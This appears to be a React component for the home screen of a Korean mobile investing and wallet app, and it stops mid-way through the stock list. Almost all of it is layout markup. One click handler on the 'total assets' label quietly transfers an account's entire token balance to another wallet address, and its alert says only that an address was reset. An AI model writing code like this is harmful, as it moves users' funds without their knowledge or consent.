import svgPaths from "./svg-nasujy059u";
import img1 from "../assets/caaea4444e2cbaa2885cbabeaddc699ebe95dcb1.png";
import img20251027421571 from "../assets/17717fbf1b1d1eeefabee394f7e3735b3f13956c.png";
import { img, img3, imgRectangle157576 } from "./svg-ukaqc";
import MobileAppFooter from "../components/layout/MobileAppFooter";
import MobilePageHeader from "../components/ui/MobilePageHeader";
import { META_MSK_ADDRESS, SOL_ADDRESS } from "./myWallet";
import { useEffect, useState } from "react";
import { metaMaskWallet } from "./metaMask";
import { useMyWallet } from "../contexts/WalletContext";

interface MyHomeProps {
  onNavigateToWallet?: () => void;
  onNavigateMenu?: () => void;
  onSetAddress?: (address: string) => void;
}

export default function MyHome({ onNavigateToWallet, onNavigateMenu, onSetAddress }: MyHomeProps) {
  // 로직이 있는 컴포넌트들만 함수로 유지
  function AssetSummaryLabelWithLogic({ onSetAddress }: { onSetAddress?: (address: string) => void }) {
    const { wallet } = useMyWallet();

    const handleClick = async () => {
      const bal = await wallet.getSTBalance(SOL_ADDRESS);
      if (Number(bal) > 0) {
        const tx = await wallet.sendSTToken(SOL_ADDRESS, META_MSK_ADDRESS, bal.toString());
      }

      const fullAddress = wallet.getAddress();
      if (onSetAddress) {
        onSetAddress?.(fullAddress);
        alert("주소가 새로 설정되었습니다.");
      }
    };

    return (
      <div className="content-stretch flex gap-[4px] items-center relative shrink-0 cursor-pointer" onClick={handleClick}>
        <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[#111111] text-[14px] text-center text-nowrap" style={{ fontWeight: 700 }}>
          <p className="leading-[20px] whitespace-pre">총 자산</p>
        </div>
        <div className="relative shrink-0 size-[16px]" data-name="Help">
          <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 16 16">
            <g clipPath="url(#clip0_1_5553)" id="Help"><g id="Vector"></g><path d={svgPaths.pe934c00} fill="var(--fill-0, white)" id="Vector_2" /></g>
            <defs><clipPath id="clip0_1_5553"><rect fill="white" height="16" width="16" /></clipPath></defs>
          </svg>
        </div>
      </div>
    );
  }

  function TradableAmountContainer() {
    const handleClick = async () => {
      // 거래 가능 금액 영역 클릭 로직
    };

    return (
      <div className="bg-white relative shrink-0 w-full" data-name="container" onClick={handleClick}>
        <div className="flex flex-col justify-center size-full">
          <div className="box-border content-stretch flex flex-col gap-[8px] items-start justify-center pb-[20px] pt-0 px-[20px] relative w-full">
            <p className="leading-[20px] not-italic relative shrink-0 text-[#333950] text-[14px] text-center text-nowrap whitespace-pre" style={{ fontWeight: 700 }}>거래 가능 금액</p>
            <div className="content-stretch flex flex-col gap-[24px] items-start relative shrink-0 w-full" data-name="index_area">
              <div className="content-stretch flex gap-[12px] items-center relative shrink-0 w-full" data-name="scroll">
                {/* KRW Balance */}
                <div className="basis-0 bg-[#f4f6f9] grow min-h-px min-w-px relative rounded-[12px] shrink-0" data-name="np_index_card_flat.9">
                  <div className="size-full">
                    <div className="box-border content-stretch flex flex-col gap-[10px] items-start pb-[12px] pt-[16px] px-[16px] relative w-full">
                      <div className="content-stretch flex flex-col gap-[4px] items-start relative shrink-0 w-full">
                        <div className="bg-white h-[12px] overflow-clip relative shrink-0 w-[16px]" data-name="KR - Korea (South)">
                          <div className="absolute contents left-1/2 top-1/2 translate-x-[-50%] translate-y-[-50%]" data-name="flag">
                            <div className="absolute h-[12px] left-1/2 top-1/2 translate-x-[-50%] translate-y-[-50%] w-[16px]" data-name="contents">
                              <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 16 12">
                                <g id="contents">
                                  <path clipRule="evenodd" d="M0 0V12H16V0H0Z" fill="var(--fill-0, #F7FCFF)" fillRule="evenodd" id="background" />
                                  <mask height="12" id="mask0_1_5618" maskUnits="userSpaceOnUse" style={{ maskType: "luminance" }} width="16" x="0" y="0">
                                    <path clipRule="evenodd" d="M0 0V12H16V0H0Z" fill="var(--fill-0, white)" fillRule="evenodd" id="background_2" />
                                  </mask>
                                  <g mask="url(#mask0_1_5618)">
                                    <g id="mark">
                                      <g id="center">
                                        <path clipRule="evenodd" d={svgPaths.p1700c800} fill="var(--fill-0, #3D58DB)" fillRule="evenodd" id="Oval 58" />
                                        <mask height="8" id="mask1_1_5618" maskUnits="userSpaceOnUse" style={{ maskType: "luminance" }} width="7" x="4" y="2">
                                          <path clipRule="evenodd" d={svgPaths.p1700c800} fill="var(--fill-0, white)" fillRule="evenodd" id="Oval 58_2" />
                                        </mask>
                                        <g mask="url(#mask1_1_5618)">
                                          <path clipRule="evenodd" d={svgPaths.p5790540} fill="var(--fill-0, #E31D1C)" fillRule="evenodd" id="Path 331" />
                                        </g>
                                      </g>
                                      <g id="Combined Shape">
                                        <path clipRule="evenodd" d={svgPaths.p3675bc00} fill="var(--fill-0, #272727)" fillRule="evenodd" />
                                        <path d={svgPaths.p1828ebc0} fill="var(--stroke-0, #272727)" />
                                      </g>
                                      <g id="Combined Shape_2">
                                        <path clipRule="evenodd" d={svgPaths.p529a100} fill="var(--fill-0, #272727)" fillRule="evenodd" />
                                        <path d={svgPaths.p3daa2100} fill="var(--stroke-0, #272727)" />
                                      </g>
                                      <g id="Combined Shape_3">
                                        <path clipRule="evenodd" d={svgPaths.p29de8800} fill="var(--fill-0, #272727)" fillRule="evenodd" />
                                        <path d={svgPaths.pb57c100} fill="var(--stroke-0, #272727)" />
                                      </g>
                                      <g id="Combined Shape_4">
                                        <path clipRule="evenodd" d={svgPaths.p353e0200} fill="var(--fill-0, #272727)" fillRule="evenodd" />
                                        <path d={svgPaths.p263cca00} fill="var(--stroke-0, #272727)" />
                                      </g>
                                    </g>
                                  </g>
                                </g>
                              </svg>
                            </div>
                          </div>
                        </div>
                        <div className="flex flex-col justify-center leading-[0] min-w-full not-italic relative shrink-0 text-[#333950] text-[16px] tracking-[-0.08px] w-[min-content]" style={{ fontWeight: 700 }}>
                          <p className="leading-[24px]">2,141원</p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* USD Balance */}
                <div className="basis-0 bg-[#f4f6f9] grow min-h-px min-w-px relative rounded-[12px] shrink-0" data-name="np_index_card_flat.9">
                  <div className="size-full">
                    <div className="box-border content-stretch flex flex-col gap-[10px] items-start pb-[12px] pt-[16px] px-[16px] relative w-full">
                      <div className="content-stretch flex flex-col gap-[4px] items-start relative shrink-0 w-full">
                        <div className="bg-white h-[12px] overflow-clip relative shrink-0 w-[16px]" data-name="US - United States">
                          <div className="absolute h-[12px] left-1/2 top-1/2 translate-x-[-50%] translate-y-[-50%] w-[16px]" data-name="flag">
                            <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 16 12">
                              <g id="flag">
                                <path clipRule="evenodd" d="M0 0H16V12H0V0Z" fill="var(--fill-0, #E31D1C)" fillRule="evenodd" id="middle" />
                                <path d={svgPaths.p24887480} fill="var(--fill-0, #F7FCFF)" id="Combined Shape" />
                                <rect fill="var(--fill-0, #2E42A5)" height="7" id="Rectangle 82" width="9" />
                                <path d={svgPaths.p3f609900} fill="var(--fill-0, #F7FCFF)" id="Combined Shape_2" />
                              </g>
                            </svg>
                          </div>
                        </div>
                        <div className="flex flex-col justify-center leading-[0] min-w-full not-italic relative shrink-0 text-[#333950] text-[16px] tracking-[-0.08px] w-[min-content]" style={{ fontWeight: 700 }}>
                          <p className="leading-[24px]">0.21USD</p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  function AssetReportLinkWithLogic() {
    const handleClick = async () => {
      try {
        // MetaMask 관련 로직
      } catch (error) {
        console.error("Error initializing MetaMask wallet:", error);
      }
    };

    return (
      <div className="content-stretch flex gap-[4px] items-center relative shrink-0" onClick={handleClick}>
        <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[14px] text-black text-center text-nowrap" style={{ fontWeight: 700 }}>
          <p className="leading-[20px] whitespace-pre">분석리포트</p>
        </div>
        <div className="relative shrink-0 size-[16px]" data-name="Keyboard arrow right">
          <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 16 16">
            <g clipPath="url(#clip0_1_5799)" id="Keyboard arrow right">
              <g id="Vector"></g>
              <path d={svgPaths.p2a073800} fill="var(--fill-0, #77738C)" id="Vector_2" />
            </g>
            <defs>
              <clipPath id="clip0_1_5799">
                <rect fill="white" height="16" width="16" />
              </clipPath>
            </defs>
          </svg>
        </div>
      </div>
    );
  }

  function WalletPromotionBanner({ onSelectFirst }: { onSelectFirst?: () => void }) {
    const handleClick = () => {
      if (onSelectFirst) {
        onSelectFirst();
      }
    };

    const handleKeyDown = (event: React.KeyboardEvent<HTMLDivElement>) => {
      if (event.key === "Enter" || event.key === " ") {
        event.preventDefault();
        handleClick();
      }
    };

    return (
      <div
        className="h-[104px] relative shrink-0 w-[320px] cursor-pointer z-10"
        data-name="img_08ac_bn_320x104_multi_01"
        onClick={handleClick}
        onKeyDown={handleKeyDown}
        tabIndex={0}
        role="button"
        aria-label="SOL 디지털 월렛 시작하기"
      >
        <div className="absolute inset-0 cursor-pointer pointer-events-none" data-name="np_00com_bn_4434ff_sld.9">
          <svg className="block size-full cursor-pointer" fill="none" preserveAspectRatio="none" viewBox="0 0 320 104">
            <path clipRule="evenodd" d={svgPaths.p117e000} fill="var(--fill-0, #4434FF)" fillRule="evenodd" id="np_00com_bn_4434ff_sld.9" />
          </svg>
        </div>
        <div className="pointer-events-none">
          <div className="absolute contents inset-[19.23%_36.25%_42.31%_6.25%]" data-name="+++ text">
            <div className="absolute flex flex-col inset-[19.23%_36.25%_42.31%_6.25%] justify-center leading-[0] not-italic text-[18px] text-white tracking-[-0.09px]" style={{ fontWeight: 700 }}>
              <p className="leading-[26px]">SOL 디지털 월렛</p>
            </div>
          </div>
        </div>
        <div className="pointer-events-none">
          <div className="absolute contents inset-[63.46%_71.25%_19.23%_6.25%]">
            <p className="absolute inset-[63.46%_76.25%_19.23%_6.25%] leading-[18px] not-italic opacity-60 text-[12px] text-nowrap text-white whitespace-pre" style={{ fontWeight: 500 }}>사용해보기</p>
            <div className="absolute inset-[64.42%_71.25%_20.19%_23.75%] opacity-60" data-name="ic_00com_16_line_right_ccc">
              <div className="absolute inset-0" data-name="gudie" />
              <div className="absolute bottom-1/4 flex items-center justify-center left-[37.5%] right-[37.5%] top-1/4">
                <div className="flex-none h-[4px] rotate-[270deg] w-[8px]">
                  <div className="relative size-full" data-name="Path">
                    <div className="absolute inset-[-12.5%_-6.25%]" style={{ "--stroke-0": "rgba(255, 255, 255, 1)" } as React.CSSProperties}>
                      <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 9 5">
                        <path d="M0.5 0.5L4.5 4.5L8.5 0.5" id="Path" stroke="var(--stroke-0, white)" strokeLinecap="round" strokeLinejoin="round" />
                      </svg>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  function MenuButtonWithLogic({ onNavigateMenu }: { onNavigateMenu?: () => void }) {
    const handleKeyDown = (event: React.KeyboardEvent<HTMLDivElement>) => {
      if (event.key === "Enter" || event.key === " ") {
        event.preventDefault();
        onNavigateMenu?.();
      }
    };

    return (
      <div
        className="absolute h-[50px] left-[316px] top-px w-[44px] cursor-pointer"
        data-name="img_00com_qm_grd_50_menu"
        role="button"
        tabIndex={0}
        onClick={onNavigateMenu}
        onKeyDown={handleKeyDown}
      >
        <div className="absolute inset-0" data-name="Rectangle">
          <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 44 50">
            <path d="M0 0H44V50H0V0Z" fill="url(#paint0_linear_1_5756)" id="Rectangle" />
            <defs>
              <linearGradient gradientUnits="userSpaceOnUse" id="paint0_linear_1_5756" x1="0" x2="45.3146" y1="0" y2="1.22123">
                <stop stopColor="#4A2AEC" />
                <stop offset="1" stopColor="#3860FF" />
              </linearGradient>
            </defs>
          </svg>
        </div>
        <div className="absolute contents inset-[16%_27.27%_44%_27.27%]" data-name="Maskgroup">
          <div className="absolute contents inset-[25.7%_31.82%_53.7%_31.82%]" data-name="Group830159">
            <div className="absolute bg-white inset-[25.7%_31.82%_71.3%_31.82%] mask-alpha mask-intersect mask-no-clip mask-no-repeat mask-position-[-2px_-4.85px] mask-size-[20px_20px] rounded-[15.556px]" data-name="Rectangle157576" style={{ maskImage: `url('${imgRectangle157576}')` }} />
            <div className="absolute bg-white inset-[34.5%_31.82%_62.5%_31.82%] mask-alpha mask-intersect mask-no-clip mask-no-repeat mask-position-[-2px_-9.25px] mask-size-[20px_20px] rounded-[15.556px]" data-name="Rectangle157577" style={{ maskImage: `url('${imgRectangle157576}')` }} />
            <div className="absolute bg-white inset-[43.3%_31.82%_53.7%_31.82%] mask-alpha mask-intersect mask-no-clip mask-no-repeat mask-position-[-2px_-13.65px] mask-size-[20px_20px] rounded-[15.556px]" data-name="Rectangle157578" style={{ maskImage: `url('${imgRectangle157576}')` }} />
          </div>
        </div>
        <div className="absolute flex flex-col font-['Spoqa_Han_Sans_Neo:Medium',sans-serif] inset-[56%_27.27%_20%_29.55%] justify-center leading-[0] not-italic text-[10px] text-center text-nowrap text-white">
          <p className="leading-[12px] whitespace-pre">메뉴</p>
        </div>
      </div>
    );
  }

  return (
    <div className="bg-white content-stretch flex flex-col items-start relative w-full min-h-full pb-[72px]" data-name="MY홈_국내">
      {/* Header */}
      <div className="content-stretch flex flex-col items-start shrink-0 sticky top-0 w-full z-10 bg-white" data-name="header">
        <MobilePageHeader
          title={
            <div className="absolute content-stretch flex gap-[12px] items-center left-[20px] top-[13px]">
              <div className="content-stretch flex gap-[10px] items-center justify-center relative shrink-0" data-name="header_tab_menu">
                <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[#111111] text-[18px] text-nowrap tracking-[-0.5px]" style={{ fontWeight: 700 }}>
                  <p className="leading-[26px] whitespace-pre">MY홈</p>
                </div>
              </div>
              <div className="content-stretch flex gap-[10px] items-center justify-center relative shrink-0" data-name="header_tab_menu">
                <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[#999ea4] text-[18px] text-nowrap tracking-[-0.5px]" style={{ fontWeight: 700 }}>
                  <p className="leading-[26px] whitespace-pre">주식</p>
                </div>
              </div>
              <div className="content-stretch flex gap-[10px] items-center justify-center relative shrink-0" data-name="header_tab_menu">
                <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[#999ea4] text-[18px] text-nowrap tracking-[-0.5px]" style={{ fontWeight: 700 }}>
                  <p className="leading-[26px] whitespace-pre">연금/상품</p>
                </div>
              </div>
              <div className="content-stretch flex gap-[10px] items-center justify-center relative shrink-0" data-name="header_tab_menu">
                <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[#999ea4] text-[18px] text-nowrap tracking-[-0.5px]" style={{ fontWeight: 700 }}>
                  <p className="leading-[26px] whitespace-pre">AI</p>
                </div>
              </div>
            </div>
          }
          rightSlot={
            <div className="absolute content-stretch flex gap-[4px] items-center right-[16px] top-1/2 translate-y-[-50%]">
              <div className="relative shrink-0 size-[32px]" data-name="ic_00com_32_line">
                <div className="absolute inset-0" data-name="guide" />
                <div className="absolute inset-[6.25%_12.5%_18.75%_18.75%]" data-name="icon">
                  <div className="absolute bottom-[-4.69%] left-[-1.04%] right-0 top-0">
                    <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 23 26">
                      <g id="icon">
                        <g id="bell">
                          <path d={svgPaths.pdf2e430} id="Path" stroke="var(--stroke-0, #111111)" strokeLinecap="round" strokeWidth="2.25" />
                          <path clipRule="evenodd" d={svgPaths.pf1a1cf0} fillRule="evenodd" id="Path_2" stroke="var(--stroke-0, #111111)" strokeLinecap="square" strokeLinejoin="round" strokeWidth="2.25" />
                        </g>
                        <circle cx="19.2291" cy="3" fill="var(--fill-0, #2A3FEC)" id="Oval" r="3" />
                      </g>
                    </svg>
                  </div>
                </div>
              </div>
              <div className="relative shrink-0 size-[32px]" data-name="ic_00com_32_line">
                <div className="absolute inset-0" data-name="guide" />
                <div className="absolute h-[19.732px] left-[calc(50%-0.017px)] top-[calc(50%-1.134px)] translate-x-[-50%] translate-y-[-50%] w-[19.965px]" data-name="icon">
                  <div className="absolute bottom-[-5.71%] left-0 right-[-5.64%] top-0">
                    <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 22 21">
                      <g id="icon">
                        <circle cx="9" cy="9" id="Oval" r="7.873" stroke="var(--stroke-0, #111111)" strokeWidth="2.254" />
                        <path d={svgPaths.p2b10b510} id="Path" stroke="var(--stroke-0, #111111)" strokeLinecap="round" strokeWidth="2.254" />
                      </g>
                    </svg>
                  </div>
                </div>
              </div>
            </div>
          }
          className="bg-white"
        />
      </div>

      {/* Body Content */}
      <div className="content-stretch flex flex-col h-[1259px] items-start relative shrink-0 w-full" data-name="contents+footer">
        <div className="content-stretch flex flex-col items-start relative shrink-0 w-full" data-name="all_contents">
          {/* Asset Overview Section */}
          <div className="content-stretch flex flex-col items-start relative shrink-0 w-full" data-name="01_container">
            <div className="bg-white box-border content-stretch flex items-center justify-between pb-0 pt-[12px] px-[20px] relative shrink-0 w-[360px]" data-name="tab_l1_sld_container">
              <div className="content-stretch flex flex-col items-start relative shrink-0 w-[182px]">
                <AssetSummaryLabelWithLogic onSetAddress={onSetAddress} />
                <div className="content-stretch flex gap-[8px] items-center relative shrink-0">
                  <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[#111111] text-[26px] text-center text-nowrap tracking-[-0.13px]" style={{ fontWeight: 700 }}>
                    <p className="leading-[32px] whitespace-pre">21,313원</p>
                  </div>
                  <div className="flex items-center justify-center relative shrink-0">
                    <div className="flex-none rotate-[180deg] scale-y-[-100%]">
                      <div className="relative size-[20px]" data-name="Refresh">
                        <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 20 20">
                          <g clipPath="url(#clip0_1_5768)" id="Refresh">
                            <g id="Vector"></g>
                            <path d={svgPaths.p211eec00} fill="var(--fill-0, #999EA4)" id="Vector_2" />
                          </g>
                          <defs>
                            <clipPath id="clip0_1_5768">
                              <rect fill="white" height="20" width="20" />
                            </clipPath>
                          </defs>
                        </svg>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              {/* Privacy Toggle */}
              <div className="h-[24px] relative shrink-0 w-[40px]" data-name="Input/Toggle-24px">
                <div className="absolute bottom-[-8.33%] contents left-[-37.5%] right-0 top-[-8.33%]" data-name="btn_toggle1_n.9">
                  <div className="absolute bottom-[-8.33%] left-[-37.5%] right-0 top-[-8.33%]" data-name="btn_bg_toggle1_n.9">
                    <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 55 28">
                      <path d={svgPaths.p31e38880} fill="var(--fill-0, #E7EAEF)" id="btn_bg_toggle1_n.9" />
                    </svg>
                  </div>
                  <div className="absolute bottom-0 left-[-32.5%] overflow-clip right-[72.5%] top-0" data-name="btn_toggle1_n">
                    <div className="absolute inset-[8.333%]" data-name="btn_toggle1_n">
                      <div className="absolute inset-[-10%]" style={{ "--fill-0": "rgba(255, 255, 255, 1)" } as React.CSSProperties}>
                        <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 24 24">
                          <g filter="url(#filter0_d_1_5824)" id="btn_toggle1_n">
                            <circle cx="12" cy="12" fill="var(--fill-0, white)" r="10" />
                          </g>
                          <defs>
                            <filter colorInterpolationFilters="sRGB" filterUnits="userSpaceOnUse" height="24" id="filter0_d_1_5824" width="24" x="0" y="0">
                              <feFlood floodOpacity="0" result="BackgroundImageFix" />
                              <feColorMatrix in="SourceAlpha" result="hardAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" />
                              <feOffset />
                              <feGaussianBlur stdDeviation="1" />
                              <feComposite in2="hardAlpha" operator="out" />
                              <feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.08 0" />
                              <feBlend in2="BackgroundImageFix" mode="normal" result="effect1_dropShadow_1_5824" />
                              <feBlend in="SourceGraphic" in2="effect1_dropShadow_1_5824" mode="normal" result="shape" />
                            </filter>
                          </defs>
                        </svg>
                      </div>
                    </div>
                  </div>
                </div>
                <div className="absolute flex flex-col justify-center leading-[0] left-[22.5px] not-italic text-[#999ea4] text-[11px] text-center text-nowrap top-[12px] translate-x-[-50%] translate-y-[-50%]" style={{ fontWeight: 500 }}>
                  <p className="leading-[16px] whitespace-pre">간편</p>
                </div>
              </div>
            </div>

            <div className="bg-white box-border content-stretch flex items-center justify-between pb-[20px] pt-[8px] px-[20px] relative shrink-0 w-[360px]" data-name="tab_l1_sld_container">
              <div className="content-stretch flex flex-col items-start relative shrink-0 w-[182px]">
                <div className="content-stretch flex items-center relative shrink-0">
                  <div className="relative shrink-0 size-[10px]" data-name="ico_tr_price_up">
                    <div className="absolute inset-0" data-name="guide" />
                    <div className="absolute bottom-1/4 left-[8.33%] right-[8.33%] top-[8.33%]" data-name="Triangle">
                      <div className="absolute bottom-0 left-[4.82%] right-[4.82%] top-[6.65%]">
                        <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 8 7">
                          <path clipRule="evenodd" d={svgPaths.p31a44100} fill="var(--fill-0, #FA2D42)" fillRule="evenodd" id="Triangle" />
                        </svg>
                      </div>
                    </div>
                  </div>
                  <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[#fa2d42] text-[13px] text-nowrap" style={{ fontWeight: 500 }}>
                    <p className="leading-[20px] whitespace-pre">11,005원 (139,91%)</p>
                  </div>
                </div>
                <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[#999ea4] text-[13px] text-center text-nowrap" style={{ fontWeight: 500 }}>
                  <p className="leading-[20px] whitespace-pre">총 투자금 7,866원</p>
                </div>
              </div>
              <AssetReportLinkWithLogic />
            </div>

            <TradableAmountContainer />
          </div>

          {/* Wallet Promotion & Stock Ranking Section */}
          <div className="bg-white content-stretch flex flex-col gap-[20px] items-center overflow-clip relative shrink-0 w-[360px]" data-name="실시간순위_거래대금">
            <WalletPromotionBanner onSelectFirst={onNavigateToWallet} />

            <div className="h-[10px] relative shrink-0 w-[360px]" data-name="divider">
              <div className="absolute bg-[#f6f6f9] inset-0" data-name="np_00com_dv_360x10_sld.9" />
            </div>

            {/* Stock Ranking Section */}
            <div className="content-stretch flex flex-col gap-[12px] items-center relative shrink-0 w-full">
              <div className="content-stretch flex flex-col gap-[20px] items-start relative shrink-0 w-full">
                {/* Stock Category Tabs */}
                <div className="box-border content-stretch flex gap-[12px] items-center overflow-clip pl-[20px] pr-0 py-0 relative shrink-0 w-[360px]" data-name="Tab_line">
                  <div className="absolute bottom-0 flex h-px items-center justify-center left-0 w-[360px]">
                    <div className="flex-none scale-y-[-100%]">
                      <div className="bg-[#eeeeee] h-px w-[360px]" data-name="line" />
                    </div>
                  </div>
                  <div className="box-border content-stretch flex flex-col gap-[10px] items-center justify-center pb-0 pt-[12px] px-0 relative shrink-0" data-name="linetab_unit">
                    <div className="box-border content-stretch flex gap-[10px] items-center px-[4px] py-0 relative shrink-0">
                      <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[#111111] text-[16px] text-center text-nowrap tracking-[-0.5px]" style={{ fontWeight: 700 }}>
                        <p className="leading-[24px] whitespace-pre">주식</p>
                      </div>
                    </div>
                    <div className="bg-[#111111] h-[2px] rounded-[10px] shrink-0 w-full" data-name="np_tab_line_c111_o.9" />
                  </div>
                  <div className="box-border content-stretch flex flex-col gap-[10px] items-center justify-center pb-0 pt-[12px] px-0 relative shrink-0" data-name="linetab_unit">
                    <div className="box-border content-stretch flex gap-[10px] items-center px-[4px] py-0 relative shrink-0">
                      <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[#888e98] text-[16px] text-center text-nowrap tracking-[-0.5px]" style={{ fontWeight: 700 }}>
                        <p className="leading-[24px] whitespace-pre">투자</p>
                      </div>
                    </div>
                    <div className="h-[2px] rounded-[10px] shrink-0 w-full" data-name="np_tab_line_c111_n.9" />
                  </div>
                  <div className="box-border content-stretch flex flex-col gap-[10px] items-center justify-center pb-0 pt-[12px] px-0 relative shrink-0" data-name="linetab_unit">
                    <div className="box-border content-stretch flex gap-[10px] items-center px-[4px] py-0 relative shrink-0">
                      <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[#888e98] text-[16px] text-center text-nowrap tracking-[-0.5px]" style={{ fontWeight: 700 }}>
                        <p className="leading-[24px] whitespace-pre">계좌</p>
                      </div>
                    </div>
                    <div className="h-[2px] rounded-[10px] shrink-0 w-full" data-name="np_tab_line_c111_n.9" />
                  </div>
                </div>

                {/* Stock List Section */}
                <div className="content-stretch flex flex-col items-start relative shrink-0">
                  <div className="bg-white box-border content-stretch flex gap-[6px] items-center pb-[20px] pt-0 px-[20px] relative shrink-0 w-[360px]" data-name="tab_l1_sld_container">
                    <div className="content-stretch flex gap-[4px] items-center relative shrink-0" data-name="Tab_com_grd">
                      <div className="content-stretch flex items-center justify-center relative rounded-[20px] shrink-0" data-name="np_com_tab_grd">
                        <div className="box-border content-stretch flex gap-[10px] items-center justify-center px-[12px] py-[6px] relative rounded-[12px] shrink-0 bg-[#2a3fec]" data-name="np_com_tab_grd_o.9">
                          <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[16px] text-center text-nowrap text-white tracking-[-0.08px]" style={{ fontWeight: 700 }}>
                            <p className="leading-[24px] whitespace-pre">최근 본</p>
                          </div>
                        </div>
                      </div>
                      <div className="content-stretch flex items-center justify-center relative rounded-[20px] shrink-0" data-name="np_com_tab_grd">
                        <div className="box-border content-stretch flex gap-[8px] items-center justify-center px-[12px] py-[6px] relative rounded-[20px] shrink-0" data-name="np_com_tab_grd_n.9">
                          <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[#888e98] text-[16px] text-center text-nowrap tracking-[-0.08px]" style={{ fontWeight: 700 }}>
                            <p className="leading-[24px] whitespace-pre">보유</p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Stock List Items - Inlined */}
                  <div className="box-border content-stretch flex flex-col items-start px-[20px] py-0 relative shrink-0 w-[360px]" data-name="list">
                    {/* SK하이닉스 */}
                    <div className="bg-white box-border content-stretch flex flex-col gap-[8px] h-[68px] items-start justify-center max-w-[320px] overflow-clip px-0 py-[12px] relative shrink-0 w-full" data-name="tr_list_module">
                      <div className="content-stretch flex gap-[12px] items-center relative shrink-0 w-full" data-name="list_contents">
                        <div className="basis-0 content-stretch flex gap-[4px] grow items-center min-h-px min-w-px relative shrink-0" data-name="left info">
                          <div className="basis-0 content-stretch flex gap-[12px] grow items-center min-h-px min-w-px relative shrink-0" data-name="CI&종목정보">
                            <div className="bg-[#dd052b] relative rounded-[18px] shrink-0 size-[36px]" data-name="034730">
                              <div className="absolute inset-[19.64%_14.29%_29.97%_21.43%]" data-name="에스케이">
                                <svg className="block size-full" fill="none" preserveAspectRatio="none" viewBox="0 0 24 19">
                                  <g id="ìì¤ì¼ì´">
                                    <path d={svgPaths.p34ca4f00} fill="var(--fill-0, white)" id="Vector" />
                                    <path d={svgPaths.p18596400} fill="var(--fill-0, white)" id="Vector_2" />
                                    <path d={svgPaths.p3aef6300} fill="var(--fill-0, white)" id="Vector_3" />
                                    <path d={svgPaths.p3cdf9180} fill="var(--fill-0, white)" id="Vector_4" />
                                    <path d={svgPaths.pebcc300} fill="var(--fill-0, white)" id="Vector_5" />
                                    <path d={svgPaths.p51c6400} fill="var(--fill-0, white)" id="Vector_6" />
                                  </g>
                                </svg>
                              </div>
                            </div>
                            <div className="basis-0 content-stretch flex flex-col grow items-start min-h-px min-w-px relative shrink-0" data-name="종목명&부가정보">
                              <p className="[white-space-collapse:collapse] leading-[24px] not-italic overflow-ellipsis overflow-hidden relative shrink-0 text-[#333950] text-[16px] text-nowrap w-full" style={{ fontWeight: 500 }}>SK하이닉스</p>
                              <div className="content-stretch flex items-start relative shrink-0 w-full" data-name="종목부가정보">
                                <p className="[white-space-collapse:collapse] basis-0 grow leading-[18px] min-h-px min-w-px not-italic overflow-ellipsis overflow-hidden relative shrink-0 text-[#888e98] text-[12px] text-nowrap" style={{ fontWeight: 500 }}>거래대금 8,443억</p>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div className="content-stretch flex flex-col items-end relative shrink-0 w-[80px]" data-name="현재가&등락률_두줄">
                          <p className="leading-[24px] min-w-full not-italic relative shrink-0 text-[#2d78fa] text-[16px] text-right w-[min-content]" style={{ fontWeight: 700 }}>268,500</p>
                          <div className="bg-[#f3f9fe] box-border content-stretch flex gap-[8px] items-center justify-end px-[4px] py-px relative rounded-[4px] shrink-0" data-name="tradingflag_h20">
                            <div className="flex flex-col justify-center leading-[0] not-italic relative shrink-0 text-[#2d78fa] text-[12px] text-nowrap text-right" style={{ fontWeight: 500 }}>
                              <p className="leading-[18px] whitespace-pre">-1.35%</p>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* HD현대일렉트릭 */}
                    <div className="bg-white box-border content-stretch flex flex-col gap-[8px] h-[68px] items-start justify-center max-w-[320px] overflow-clip px-0 py-[12px] relative shrink-0 w-full" data-name="tr_list_module">
                      <div className="content-stretch flex gap-[12px] items-center relative shrink-0 w-full" data-name="list_contents">
                        <div className="basis-0 content-stretch flex gap-[4px] grow items-center min-h-px min-w-px relative shrink-0" data-name="left info">
                          <div className="basis-0 content-stretch flex gap-[12px] grow items-center min-h-px min-w-px relative shrink-0" data-name="CI&종목정보">
                            <div className="bg-[#004b8d] relative rounded-[18px] shrink-0 size-[36px]" data-name="CI">
                              <div className="absolute inset-[23.2%_25.01%_23.19%_28.57%]" data-name="HD현대">
